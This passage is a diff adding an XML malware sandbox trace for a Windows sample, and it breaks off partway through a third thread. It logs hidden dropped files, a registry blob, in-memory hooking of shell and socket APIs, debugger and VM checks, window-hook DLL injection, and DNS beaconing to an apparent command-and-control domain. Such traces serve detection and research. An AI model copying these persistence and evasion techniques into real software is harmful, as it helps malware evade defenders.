@@ -1,0 +1,399 @@
+<?xml version="1.0"?>
+<processes>
+<process index="1" pid="2676" filename="c:\bd09361685d14bb9eacb4e6d1f2c7f97.EX" filename_hash="hash_error" filesize="70656" md5="bd09361685d14bb9eacb4e6d1f2c7f97" sha1="5e6f69efbb7d0519eeeb33b8ebffb9421e682ba9" username="Administrator" parentindex="0" starttime="00:01.750" terminationtime="00:21.594" startreason="AnalysisTarget" terminationreason="NormalTermination" executionstatus="OK" applicationtype="Win32Application">
+<thread tid="2680">
+<all_section>
+<load_image filename="c:\bd09361685d14bb9eacb4e6d1f2c7f97.EX" successful="1" address="&#x24;10000000" end_address="&#x24;1001D356" size="119638" filename_hash="hash_error"/>
+<load_dll filename="C:\WINDOWS\system32\ntdll.dll" successful="1" address="&#x24;7C910000" end_address="&#x24;7C9C9000" size="757760" filename_hash="e753d19a2e3b98b2b3b8f02f276092096d10f22d"/>
+<load_dll filename="C:\WINDOWS\system32\kernel32.dll" successful="1" address="&#x24;7C800000" end_address="&#x24;7C908000" size="1081344" filename_hash="c88d57cc99f75cd928b47b6e444231f26670138f"/>
+<load_dll filename="C:\WINDOWS\system32\user32.dll" successful="1" address="&#x24;7E360000" end_address="&#x24;7E3F1000" size="593920" filename_hash="08fe9ff1fe9b8fd237adedb10d65fb0447b91fe5"/>
+<load_dll filename="C:\WINDOWS\system32\GDI32.dll" successful="1" address="&#x24;77EF0000" end_address="&#x24;77F39000" size="299008" filename_hash="0f37018f672c7635691f7317ade3c5a63904ec96"/>
+<load_dll filename="C:\WINDOWS\system32\IMM32.DLL" successful="1" address="&#x24;76330000" end_address="&#x24;7634D000" size="118784" filename_hash="f9be7678080084bc3cb48d0cb64bba9ba98800f1"/>
+<load_dll filename="C:\WINDOWS\system32\ADVAPI32.dll" successful="1" address="&#x24;77DA0000" end_address="&#x24;77E4A000" size="696320" filename_hash="ea2e9bac1789b53d7efcd675a63f4a2b44898439"/>
+<load_dll filename="C:\WINDOWS\system32\RPCRT4.dll" successful="1" address="&#x24;77E50000" end_address="&#x24;77EE2000" size="598016" filename_hash="f3bb6474ec18ee9cccc02ef44510a78b42058a41"/>
+<load_dll filename="C:\WINDOWS\system32\Secur32.dll" successful="1" address="&#x24;77FC0000" end_address="&#x24;77FD1000" size="69632" filename_hash="31166d1e35a911a082149f5efac2dac228109615"/>
+<load_dll filename="C:\WINDOWS\system32\oleaut32.dll" successful="1" address="&#x24;770F0000" end_address="&#x24;7717B000" size="569344" filename_hash="3168a173d177f470928b468db777640861dcb32e"/>
+<load_dll filename="C:\WINDOWS\system32\msvcrt.dll" successful="1" address="&#x24;77BE0000" end_address="&#x24;77C38000" size="360448" filename_hash="70d5f97088cc9348bb9d10098af0738a696b96de"/>
+<load_dll filename="C:\WINDOWS\system32\ole32.dll" successful="1" address="&#x24;774B0000" end_address="&#x24;775ED000" size="1298432" filename_hash="c7753525d5276ab92a01a8a3c39cfb5269da7f98"/>
+<load_dll filename="C:\WINDOWS\system32\pstorec.dll" successful="1" address="&#x24;5E490000" end_address="&#x24;5E49D000" size="53248" filename_hash="8ae378a352c4a13516bf1fe5a8615d8893d2ff2d"/>
+<load_dll filename="C:\WINDOWS\system32\ATL.DLL" successful="1" address="&#x24;76AD0000" end_address="&#x24;76AE1000" size="69632" filename_hash="59cb82f432d529da3e81b030b2365c22a95fd35a"/>
+<get_windows_directory/>
+<create_mutex name="Global\gepakabayimegus" owned="0"/>
+<open_file filetype="namedpipe" srcfile="\\.\PIPE\lsarpc" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="SECURITY_ANONYMOUS"/>
+<create_mutex name="Global\mukewopela" owned="0"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;7E6F11E0" address="&#x24;7E6F1000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READWRITE" behavior="Normal" target="SHELL32.dll.ShellExecuteA"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;7E6F11E0" address="&#x24;7E6F1000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READ" behavior="Normal" target="SHELL32.dll.ShellExecuteA"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;7E765D48" address="&#x24;7E765000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READWRITE" behavior="Normal" target="SHELL32.dll.ShellExecuteW"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;7E765D48" address="&#x24;7E765000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READ" behavior="Normal" target="SHELL32.dll.ShellExecuteW"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;7E6B996B" address="&#x24;7E6B9000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READWRITE" behavior="Normal" target="SHELL32.dll.ShellExecuteExW"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;7E6B996B" address="&#x24;7E6B9000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READ" behavior="Normal" target="SHELL32.dll.ShellExecuteExW"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;7E6F0EB5" address="&#x24;7E6F0000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READWRITE" behavior="Normal" target="SHELL32.dll.ShellExecuteEx"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;7E6F0EB5" address="&#x24;7E6F0000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READ" behavior="Normal" target="SHELL32.dll.ShellExecuteEx"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;7E77410F" address="&#x24;7E774000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READWRITE" behavior="Normal" target="SHELL32.dll.SHLoadInProc"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;7E77410F" address="&#x24;7E774000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READ" behavior="Normal" target="SHELL32.dll.SHLoadInProc"/>
+<load_dll filename="C:\WINDOWS\system32\IMM32.DLL" successful="1" address="&#x24;76330000" end_address="&#x24;7634D000" size="118784" filename_hash="f9be7678080084bc3cb48d0cb64bba9ba98800f1"/>
+<load_dll filename="C:\WINDOWS\system32\SHELL32.dll" successful="1" address="&#x24;7E670000" end_address="&#x24;7EE91000" size="8523776" filename_hash="bbe9d57955e5d348e664b72faf331a7b9d722d0c"/>
+<open_file filetype="namedpipe" srcfile="\\.\PIPE\lsarpc" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="SECURITY_ANONYMOUS"/>
+<open_file filetype="file" srcfile="C:\WINDOWS\system32\ketamuri" srcfile_hash="hash_error" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="FILE_ATTRIBUTE_NORMAL SECURITY_ANONYMOUS"/>
+<open_file filetype="namedpipe" srcfile="\\.\PIPE\lsarpc" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="SECURITY_ANONYMOUS"/>
+<open_file filetype="file" srcfile="C:\WINDOWS\ketamuri" srcfile_hash="hash_error" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="FILE_ATTRIBUTE_NORMAL SECURITY_ANONYMOUS"/>
+<open_file filetype="namedpipe" srcfile="\\.\PIPE\lsarpc" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="SECURITY_ANONYMOUS"/>
+<open_file filetype="file" srcfile="C:\Programme\ketamuri" srcfile_hash="hash_error" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="FILE_ATTRIBUTE_NORMAL SECURITY_ANONYMOUS"/>
+<open_file filetype="namedpipe" srcfile="\\.\PIPE\lsarpc" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="SECURITY_ANONYMOUS"/>
+<open_file filetype="file" srcfile="C:\Dokumente und Einstellungen\All Users\Anwendungsdaten\ketamuri" srcfile_hash="hash_error" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="FILE_ATTRIBUTE_NORMAL SECURITY_ANONYMOUS"/>
+<open_file filetype="namedpipe" srcfile="\\.\PIPE\lsarpc" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="SECURITY_ANONYMOUS"/>
+<open_file filetype="file" srcfile="c:\ketamuri" srcfile_hash="hash_error" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="FILE_ATTRIBUTE_NORMAL SECURITY_ANONYMOUS"/>
+<open_file filetype="namedpipe" srcfile="\\.\PIPE\lsarpc" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="SECURITY_ANONYMOUS"/>
+<open_file filetype="file" srcfile="C:\ketamuri" srcfile_hash="hash_error" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="FILE_ATTRIBUTE_NORMAL SECURITY_ANONYMOUS"/>
+<open_file filetype="namedpipe" srcfile="\\.\PIPE\lsarpc" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="SECURITY_ANONYMOUS"/>
+<create_open_file filetype="file" srcfile="C:\WINDOWS\system32\yosimanu.dll" srcfile_hash="hash_error" creationdistribution="OPEN_ALWAYS" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ" flags="FILE_ATTRIBUTE_HIDDEN FILE_ATTRIBUTE_SYSTEM SECURITY_ANONYMOUS"/>
+<get_system_time apifunction="GetSystemTime"/>
+<set_file_time filetype="file" srcfile="C:\WINDOWS\system32\yosimanu.dll" srcfile_hash="hash_error" desiredaccess="FILE_ANY_ACCESS" flags="SECURITY_ANONYMOUS"/>
+<delete_file filetype="file" srcfile="C:\WINDOWS\system32\yosimanu.dll" srcfile_hash="hash_error" desiredaccess="FILE_ANY_ACCESS" flags="SECURITY_ANONYMOUS"/>
+<create_open_file filetype="file" srcfile="C:\WINDOWS\system32\ketamuri" srcfile_hash="hash_error" creationdistribution="OPEN_ALWAYS" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="FILE_ATTRIBUTE_HIDDEN SECURITY_ANONYMOUS"/>
+<get_system_time apifunction="GetSystemTime"/>
+<set_file_time filetype="file" srcfile="C:\WINDOWS\system32\ketamuri" srcfile_hash="hash_error" desiredaccess="FILE_ANY_ACCESS" flags="SECURITY_ANONYMOUS"/>
+<open_key key="HKEY_LOCAL_MACHINE\Software\Microsoft"/>
+<open_key key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\metedila"/>
+<open_key key="HKEY_CURRENT_USER\Software\Microsoft"/>
+<open_key key="HKEY_CURRENT_USER\Software\Microsoft\metedila"/>
+<open_file filetype="file" srcfile="c:\bd09361685d14bb9eacb4e6d1f2c7f97.EX" srcfile_hash="hash_error" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ" flags="SECURITY_ANONYMOUS"/>
+<load_dll filename="C:\WINDOWS\system32\ole32.dll" successful="1" address="&#x24;774B0000" end_address="&#x24;775ED000" size="1298432" filename_hash="c7753525d5276ab92a01a8a3c39cfb5269da7f98"/>
+<check_for_debugger apifunction="IsDebuggerPresent"/>
+<load_dll filename="C:\WINDOWS\system32\uxtheme.dll" successful="1" address="&#x24;5B0F0000" end_address="&#x24;5B128000" size="229376" filename_hash="16c4d24a172bfbc67f488d6b4086b9e10f8eaf4b"/>
+<get_system_directory/>
+<get_file_attributes filetype="file" srcfile="C:\WINDOWS\" srcfile_hash="hash_error" desiredaccess="FILE_ANY_ACCESS" flags="SECURITY_ANONYMOUS"/>
+<load_dll filename="C:\WINDOWS\system32\setupapi.dll" successful="1" address="&#x24;778F0000" end_address="&#x24;779E4000" size="999424" filename_hash="8109df4e050264532bb5757e9da4ae12e29b800f"/>
+<revert_to_self tokenhandle="0"/>
+<open_mutex name="VMMainMutex" owned="1"/>
+<open_mutex name="Global\VMMainMutex" owned="1"/>
+<open_mutex name="VMProtectionMutex" owned="1"/>
+<open_mutex name="Global\VMProtectionMutex" owned="1"/>
+<open_key key="HKEY_LOCAL_MACHINE\Software\Microsoft"/>
+<create_key key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\metedila"/>
+<query_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\metedila" value="jofosefo"/>
+<set_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\metedila" value="jofosefo" data="[REG_BINARY, size: 1744 bytes]"/>
+<open_key key="HKEY_LOCAL_MACHINE\Software\Microsoft"/>
+<open_key key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\metedila"/>
+<query_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\metedila" value="gawinene"/>
+<open_key key="HKEY_CURRENT_USER\Software\Microsoft"/>
+<open_key key="HKEY_CURRENT_USER\Software\Microsoft\metedila"/>
+<enum_processes apifunction="Process32First"/>
+<create_thread targetpid="2676" threadid="2736" address="&#x24;100018D1" parameteraddress="&#x24;00934290"/>
+<create_thread targetpid="2676" threadid="2740" address="&#x24;10001F2D" parameteraddress="&#x24;00000000"/>
+<create_thread targetpid="2676" threadid="2744" address="&#x24;10001F2D" parameteraddress="&#x24;00000001"/>
+<create_thread targetpid="2676" threadid="2748" address="&#x24;10001F2D" parameteraddress="&#x24;00000002"/>
+<open_file filetype="file" srcfile="c:\bd09361685d14bb9eacb4e6d1f2c7f97.EX" srcfile_hash="hash_error" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ" flags="FILE_ATTRIBUTE_NORMAL SECURITY_ANONYMOUS"/>
+<load_dll filename="C:\WINDOWS\system32\bedihidu.dll" successful="1" address="&#x24;D50000" end_address="&#x24;D6D356" size="119638" filename_hash="hash_error"/>
+<set_windows_hook hookid="WH_CALLWNDPROCRET" threadid="0" hook_address="&#x24;00D530B4" hook_module="&#x24;00D50000"/>
+<get_windows_directory/>
+<create_thread targetpid="2676" threadid="2860" address="&#x24;00D5728A" parameteraddress="&#x24;00934E48"/>
+<load_dll filename="C:\WINDOWS\system32\bedihidu.dll" successful="1" address="&#x24;D50000" end_address="&#x24;D6D356" size="119638" filename_hash="hash_error"/>
+<set_windows_hook hookid="WH_CALLWNDPROCRET" threadid="0" hook_address="&#x24;00D530B4" hook_module="&#x24;00D50000"/>
+<sleep milliseconds="10000"/>
+<open_mutex name="Global\gepakabayimegus" owned="1"/>
+<kill_process targetpid="2676" apifunction="NtTerminateProcess"/>
+<enum_window/>
+</all_section>
+</thread>
+<thread tid="2736">
+<all_section>
+<vm_protect targetpid="2676" wantedaddress="&#x24;71A1EA43" address="&#x24;71A1E000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READWRITE" behavior="Normal" target="WS2_32.dll.WSAAsyncGetHostByAddr"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;71A1EA43" address="&#x24;71A1E000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READ" behavior="Normal" target="WS2_32.dll.WSAAsyncGetHostByAddr"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;71A12899" address="&#x24;71A12000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READWRITE" behavior="Normal" target="WS2_32.dll.GetAddrInfoW"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;71A12899" address="&#x24;71A12000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READ" behavior="Normal" target="WS2_32.dll.GetAddrInfoW"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;71A16A55" address="&#x24;71A16000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READWRITE" behavior="Normal" target="WS2_32.dll.WSAStartup"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;71A16A55" address="&#x24;71A16000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READ" behavior="Normal" target="WS2_32.dll.WSAStartup"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;71A13FED" address="&#x24;71A13000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READWRITE" behavior="Normal" target="WS2_32.dll.WSACleanup"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;71A13FED" address="&#x24;71A13000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READ" behavior="Normal" target="WS2_32.dll.WSACleanup"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;71A14211" address="&#x24;71A14000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READWRITE" behavior="Normal" target="WS2_32.dll.socket"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;71A14211" address="&#x24;71A14000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READ" behavior="Normal" target="WS2_32.dll.socket"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;71A18B6A" address="&#x24;71A18000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READWRITE" behavior="Normal" target="WS2_32.dll.WSASocketA"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;71A18B6A" address="&#x24;71A18000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READ" behavior="Normal" target="WS2_32.dll.WSASocketA"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;71A1404E" address="&#x24;71A14000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READWRITE" behavior="Normal" target="WS2_32.dll.WSASocketW"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;71A1404E" address="&#x24;71A14000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READ" behavior="Normal" target="WS2_32.dll.WSASocketW"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;71A14480" address="&#x24;71A14000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READWRITE" behavior="Normal" target="WS2_32.dll.bind"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;71A14480" address="&#x24;71A14000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READ" behavior="Normal" target="WS2_32.dll.bind"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;71A18CD3" address="&#x24;71A18000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READWRITE" behavior="Normal" target="WS2_32.dll.listen"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;71A18CD3" address="&#x24;71A18000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READ" behavior="Normal" target="WS2_32.dll.listen"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;71A21040" address="&#x24;71A21000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READWRITE" behavior="Normal" target="WS2_32.dll.accept"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;71A21040" address="&#x24;71A21000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READ" behavior="Normal" target="WS2_32.dll.accept"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;71A20DC1" address="&#x24;71A20000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READWRITE" behavior="Normal" target="WS2_32.dll.WSAAccept"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;71A20DC1" address="&#x24;71A20000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READ" behavior="Normal" target="WS2_32.dll.WSAAccept"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;71A14A07" address="&#x24;71A14000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READWRITE" behavior="Normal" target="WS2_32.dll.connect"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;71A14A07" address="&#x24;71A14000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READ" behavior="Normal" target="WS2_32.dll.connect"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;71A20C81" address="&#x24;71A20000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READWRITE" behavior="Normal" target="WS2_32.dll.WSAConnect"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;71A20C81" address="&#x24;71A20000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READ" behavior="Normal" target="WS2_32.dll.WSAConnect"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;71A1676F" address="&#x24;71A16000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READWRITE" behavior="Normal" target="WS2_32.dll.recv"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;71A1676F" address="&#x24;71A16000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READ" behavior="Normal" target="WS2_32.dll.recv"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;71A14CB5" address="&#x24;71A14000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READWRITE" behavior="Normal" target="WS2_32.dll.WSARecv"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;71A14CB5" address="&#x24;71A14000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READ" behavior="Normal" target="WS2_32.dll.WSARecv"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;71A12FF7" address="&#x24;71A12000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READWRITE" behavior="Normal" target="WS2_32.dll.recvfrom"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;71A12FF7" address="&#x24;71A12000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READ" behavior="Normal" target="WS2_32.dll.recvfrom"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;71A1F66A" address="&#x24;71A1F000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READWRITE" behavior="Normal" target="WS2_32.dll.WSARecvFrom"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;71A1F66A" address="&#x24;71A1F000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READ" behavior="Normal" target="WS2_32.dll.WSARecvFrom"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;71A14C27" address="&#x24;71A14000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READWRITE" behavior="Normal" target="WS2_32.dll.send"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;71A14C27" address="&#x24;71A14000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READ" behavior="Normal" target="WS2_32.dll.send"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;71A168FA" address="&#x24;71A16000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READWRITE" behavior="Normal" target="WS2_32.dll.WSASend"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;71A168FA" address="&#x24;71A16000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READ" behavior="Normal" target="WS2_32.dll.WSASend"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;71A12F51" address="&#x24;71A12000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READWRITE" behavior="Normal" target="WS2_32.dll.sendto"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;71A12F51" address="&#x24;71A12000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READ" behavior="Normal" target="WS2_32.dll.sendto"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;71A20AAD" address="&#x24;71A20000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READWRITE" behavior="Normal" target="WS2_32.dll.WSASendTo"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;71A20AAD" address="&#x24;71A20000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READ" behavior="Normal" target="WS2_32.dll.WSASendTo"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;71A15355" address="&#x24;71A15000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READWRITE" behavior="Normal" target="WS2_32.dll.gethostbyname"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;71A15355" address="&#x24;71A15000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READ" behavior="Normal" target="WS2_32.dll.gethostbyname"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;71A1E491" address="&#x24;71A1E000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READWRITE" behavior="Normal" target="WS2_32.dll.gethostbyaddr"/>
+<vm_protect targetpid="2676" wantedaddress="&#x24;71A1E491" address="&#x24;71A1E000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READ" behavior="Normal" target="WS2_32.dll.gethostbyaddr"/>
+<load_dll filename="C:\WINDOWS\system32\dnsapi.dll" successful="1" address="&#x24;76EE0000" end_address="&#x24;76F07000" size="159744" filename_hash="3eaf6478c6f14794b05a612d845c1725757beb0b"/>
+<get_system_directory/>
+<open_file filetype="file" srcfile="C:\WINDOWS\system32\drivers\etc\hosts" srcfile_hash="c75d4c6e53a497c4dc1df1f50bbef08ac625a3d8" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="FILE_ATTRIBUTE_NORMAL SECURITY_ANONYMOUS"/>
+<load_dll filename="crypt32.dll" successful="1" address="&#x24;1100001" end_address="&#x24;1100001" size="0" filename_hash="3127dbe44b75c673c24f9ad63675ff91cd9c6321"/>
+<open_key key="HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Cryptography"/>
+<open_key key="HKEY_LOCAL_MACHINE\Software\Microsoft\Cryptography"/>
+<query_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography" value="MachineGuid"/>
+<open_key key="HKEY_LOCAL_MACHINE\Software\Microsoft\Cryptography\Offload"/>
+<create_socket socket="4294967295" socket_type="SOCK_DGRAM" successful="0"/>
+<open_key key="HKEY_LOCAL_MACHINE\Software\Microsoft\Rpc\SecurityService"/>
+<query_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Rpc\SecurityService" value="DefaultAuthLevel"/>
+<create_socket socket="1520" socket_type="SOCK_DGRAM" successful="1"/>
+<send_socket socket="1520" remote_addr="85.12.43.103" remote_port="53" buffer_len="99">
+<dump_line offset="&#x24;0000" dump="CE 18 01 00 00 01 00 00 00 00 00 00 02 31 31 20 " ascii=".............11 "/>
+<dump_line offset="&#x24;0010" dump="32 37 32 32 62 64 36 32 61 61 32 63 33 62 34 32 " ascii="2722bd62aa2c3b42"/>
+<dump_line offset="&#x24;0020" dump="62 33 32 32 65 31 61 34 38 35 63 65 36 33 36 65 " ascii="b322e1a485ce636e"/>
+<dump_line offset="&#x24;0030" dump="06 6D 32 30 30 30 33 04 67 6C 32 32 01 30 01 2D " ascii=".m20003.gl22.0.-"/>
+<dump_line offset="&#x24;0040" dump="03 32 36 31 01 30 01 2D 01 30 06 31 37 39 36 39 " ascii=".261.0.-.0.17969"/>
+<dump_line offset="&#x24;0050" dump="34 08 75 72 6F 6C 65 64 75 70 03 63 6F 6D 00 00 " ascii="4.uroledup.com.."/>
+<dump_line offset="&#x24;0060" dump="01 00 01                                        " ascii="..."/>
+</send_socket>
+<load_dll filename="C:\WINDOWS\system32\WS2_32.dll" successful="1" address="&#x24;71A10000" end_address="&#x24;71A27000" size="94208" filename_hash="7cf3366c68e402eb3678046fe97651a586044560"/>
+<open_file filetype="namedpipe" srcfile="\\.\PIPE\lsarpc" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="SECURITY_ANONYMOUS"/>
+<send_socket socket="1520" remote_addr="85.12.43.103" remote_port="53" buffer_len="99">
+<dump_line offset="&#x24;0000" dump="CE 18 01 00 00 01 00 00 00 00 00 00 02 31 31 20 " ascii=".............11 "/>
+<dump_line offset="&#x24;0010" dump="32 37 32 32 62 64 36 32 61 61 32 63 33 62 34 32 " ascii="2722bd62aa2c3b42"/>
+<dump_line offset="&#x24;0020" dump="62 33 32 32 65 31 61 34 38 35 63 65 36 33 36 65 " ascii="b322e1a485ce636e"/>
+<dump_line offset="&#x24;0030" dump="06 6D 32 30 30 30 33 04 67 6C 32 32 01 30 01 2D " ascii=".m20003.gl22.0.-"/>
+<dump_line offset="&#x24;0040" dump="03 32 36 31 01 30 01 2D 01 30 06 31 37 39 36 39 " ascii=".261.0.-.0.17969"/>
+<dump_line offset="&#x24;0050" dump="34 08 75 72 6F 6C 65 64 75 70 03 63 6F 6D 00 00 " ascii="4.uroledup.com.."/>
+<dump_line offset="&#x24;0060" dump="01 00 01                                        " ascii="..."/>
+</send_socket>
+<create_thread targetpid="2676" threadid="3196" address="&#x24;77DC848A" parameteraddress="&#x24;00000000"/>
+</all_section>
+</thread>
+<thread tid="2744">
+<all_section>
+<open_file filetype="namedpipe" srcfile="\\.\PIPE\lsarpc" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="SECURITY_ANONYMOUS"/>
